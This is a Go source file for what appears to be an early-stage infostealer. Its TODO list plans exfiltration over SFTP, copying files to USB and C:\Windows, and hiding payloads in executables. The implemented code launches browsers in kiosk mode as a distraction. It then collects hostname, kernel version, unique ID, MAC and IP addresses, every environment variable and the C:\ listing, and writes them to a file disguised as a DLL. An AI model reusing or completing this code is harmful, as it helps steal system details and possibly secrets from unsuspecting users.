package main

/*
	TODO
- Distraction (open Browser in full screen mode)
- Get List of Directories in C:\
- Copy Files to USB & C:\Windows\
- Upload DLLs to SFTP Server
- Download file from SFTP server and hide in exe on Desktop
-

*/

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"reflect"
	"strings"

	"github.com/elastic/go-sysinfo"
)

func main() {
	distraction()
	saveAllInfo()
	// fileManger()
}

func fileManager() {
	// hideFiles()
	// exportFiles()
	// downloadFiles()
}

func saveAllInfo() {
	f, err := os.Create("crapS3751243.dll")
	os.Link("crapS3751243.dll", "crapS3636862.dll")

	system := sysGrab()
	environment := envGrab()
	network := netGrab()
	folders := folderGrab()

	f.WriteString("[SYSTEM INFO]\n" + system + "\n\n")
	f.WriteString("[NETWORK INFO]\n" + network + "\n\n")
	f.WriteString("[ENVIRONMENT INFO]\n" + environment + "\n\n")
	f.WriteString("[FOLDER INFO]\n" + folders + "\n\n")

	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
}

func hideFiles() {

}

func distraction() {
	cmnd1 := exec.Command("C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE", "-k")
	cmnd2 := exec.Command("C:\\Program Files\\Mozilla Firefox\\firefox.exe", "-kiosk")
	cmnd1.Start()
	cmnd2.Start()
}

func sysGrab() string {
	var systemInfo string

	f, err := sysinfo.Host()
	info := f.Info()

	systemInfo += "Hostname => " + info.Hostname
	systemInfo += "\nTimezone => " + info.Timezone
	systemInfo += "\nKernel => " + info.KernelVersion
	systemInfo += "\nUniqueID => " + info.UniqueID

	if err != nil {
		fmt.Println(err)
		return ""
	}

	return systemInfo
}

func netGrab() string {
	var networkInfo string

	f, err := sysinfo.Host()
	net := f.Info()

	mac := reflect.ValueOf(net.MACs).Interface().([]string)
	networkInfo += "MAC Addresses =>"
	for i := range mac {
		networkInfo += "\n\t" + net.MACs[i]
	}

	ips := reflect.ValueOf(net.IPs).Interface().([]string)
	networkInfo += "\n IP Addresses => "
	for i := range ips {
		networkInfo += "\n\t" + net.IPs[i]
	}

	if err != nil {
		fmt.Println(err)
		return ""
	}

	return networkInfo
}

func envGrab() string {
	var envoInfo string
	// Get all env variables
	for _, element := range os.Environ() {
		variable := strings.Split(element, "=")
		onlyString := variable[0] + " => " + variable[1] + "\n"
		envoInfo += onlyString
	}
	return envoInfo
}

func folderGrab() string {
	var envoInfo string

	files, err := ioutil.ReadDir("C:\\")
	if err != nil {
	}
	for _, f := range files {
		envoInfo += f.Name() + "\n"
	}

	return envoInfo
}
